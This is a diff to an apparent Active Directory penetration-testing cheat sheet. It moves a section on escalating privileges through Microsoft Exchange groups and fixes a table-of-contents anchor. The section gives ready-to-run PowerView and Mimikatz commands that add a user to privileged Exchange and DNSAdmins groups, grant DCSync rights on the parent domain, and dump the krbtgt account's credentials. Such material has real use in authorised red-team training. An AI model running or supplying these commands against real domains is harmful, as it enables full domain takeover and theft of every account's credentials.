@@ -13,7 +13,7 @@
 * [DNS Admins](#DNS-Admins)
 * [Trust abuse SQL](#Trust-abuse-SQL)
 * [Cross Domain attacks](#Cross-Domain-attacks)
-  * [MS Exchange](#MS-Exchange2)
+  * [MS Exchange](#MS-Exchange)
   * [Azure AD](#Azure-AD)
   * [Trust abuse SQL](#Trust-abuse-SQL)
   * [Child to Forest Root](#Child-to-Forest-Root)
@@ -261,6 +261,46 @@ Invoke-OpenInboxFinder -EmailList emails.txt -ExchHostname us-exchange -Verbose
 Invoke-SelfSearch -Mailbox <EMAIL> -ExchHostname <EXCHANGE SERVER NAME> -OutputCsv .\mail.csv
 ```
 
+### MS Exchange escalating privileges
+![afbeelding](https://user-images.githubusercontent.com/43987245/119706037-bf8d3000-be59-11eb-84cc-6568ba6e5d26.png)
+
+#### Enumerate if exchange groups exist
+```
+. ./Powerview.ps1
+Get-DomainGroup *exchange* -Domain <DOMAIN>
+```
+
+#### Enumerate membership of the groups
+```
+Get-DomainGroupMember "Organization Management" -Domain <DOMAIN>
+Get-DomainGroupMember "Exchange Trusted Subsystem" -Domain <DOMAIN>
+```
+
+#### If we have privileges of a member of the Organization Management, we can add a user to the 'Exchange Windows Permissions' group.
+```
+$user = Get-DomainUser -Identity <USER>
+$group = Get-DomainGroup -Identity 'Exchange Windows Permissions' -Domain <DOMAIN>
+Add-DomainGroupMember -Identity $group -Members $user -Verbose
+```
+
+#### Add permissions to execute DCSYNC
+```
+Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -PrincipalIdentity '<CHILD DOMAIN>\<USER>' -Rights DCSync -Verbose
+```
+
+#### Execute DCSYNC
+- use ```/all``` instead of ```/user``` to list all users
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<PARENT DOMAIN>\krbtgt /domain:<PARENT DOMAIN>"'
+```
+
+#### If we have privileges of 'exchange user', who is a member of the Exchange Trusted Subsystem, we can add any user to the DNSAdmins group:
+```
+$user = Get-DomainUser -Identity <USER>
+$group = Get-DomainGroup -Identity 'DNSAdmins' -Domain <DOMAIN>
+Add-DomainGroupMember -Identity $group -Members $user -Verbose
+```
+
 ## Delegation
 ### Unconstrained Delegation
 - To execute attack owning the server with unconstrained delegation is required!
@@ -414,46 +454,6 @@ Sc \\<dns server> start dns
 ```
 
 ## Cross Domain attacks
-### MS Exchange2
-![afbeelding](https://user-images.githubusercontent.com/43987245/119706037-bf8d3000-be59-11eb-84cc-6568ba6e5d26.png)
-
-#### Enumerate if exchange groups exist
-```
-. ./Powerview.ps1
-Get-DomainGroup *exchange* -Domain <DOMAIN>
-```
-
-#### Enumerate membership of the groups
-```
-Get-DomainGroupMember "Organization Management" -Domain <DOMAIN>
-Get-DomainGroupMember "Exchange Trusted Subsystem" -Domain <DOMAIN>
-```
-
-#### If we have privileges of a member of the Organization Management, we can add a user to the 'Exchange Windows Permissions' group.
-```
-$user = Get-DomainUser -Identity <USER>
-$group = Get-DomainGroup -Identity 'Exchange Windows Permissions' -Domain <DOMAIN>
-Add-DomainGroupMember -Identity $group -Members $user -Verbose
-```
-
-#### Add permissions to execute DCSYNC
-```
-Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -PrincipalIdentity '<CHILD DOMAIN>\<USER>' -Rights DCSync -Verbose
-```
-
-#### Execute DCSYNC
-- use ```/all``` instead of ```/user``` to list all users
-```
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:<PARENT DOMAIN>\krbtgt /domain:<PARENT DOMAIN>"'
-```
-
-#### If we have privileges of 'exchange user', who is a member of the Exchange Trusted Subsystem, we can add any user to the DNSAdmins group:
-```
-$user = Get-DomainUser -Identity <USER>
-$group = Get-DomainGroup -Identity 'DNSAdmins' -Domain <DOMAIN>
-Add-DomainGroupMember -Identity $group -Members $user -Verbose
-```
-
 ## Azure AD
 #### Enumerate where PHS AD connect is installed
 ```
